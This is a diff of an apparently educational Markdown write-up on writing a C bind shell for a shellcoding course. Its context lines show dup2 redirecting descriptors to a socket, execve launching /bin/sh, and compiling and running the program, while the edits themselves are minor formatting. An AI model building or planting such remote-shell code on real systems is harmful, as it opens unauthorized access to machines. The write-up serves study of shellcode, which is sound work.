@@ -141,7 +141,7 @@ for(i = 0; i < 3; i++)
 	dup2(my_accept, i);
 ```
 
-### Execve
+### Execve
 
 At last we can finnaly call execve:
 ```C
@@ -155,7 +155,7 @@ SYNOPSIS
 ```C
 execve("/bin/sh", NULL, NULL);
 ```
-### Code
+### Code
 
 Lets try to compile it by removing the includes one by one in order to remove unecessary include. Finally there is a C Bind Shell:
 
@@ -195,6 +195,8 @@ In a first terminal:
 ```
 cervoise@slae:~/exam/bind$ gcc bind_shell.c -o bind_shell cervoise@slae:~/exam/bind$ ./bind_shell
 ```
+
+In another terminal:
 ```
 cervoise@slae:~/slae/Shellcode$ netstat -laput |grep bind_shell
 [...]
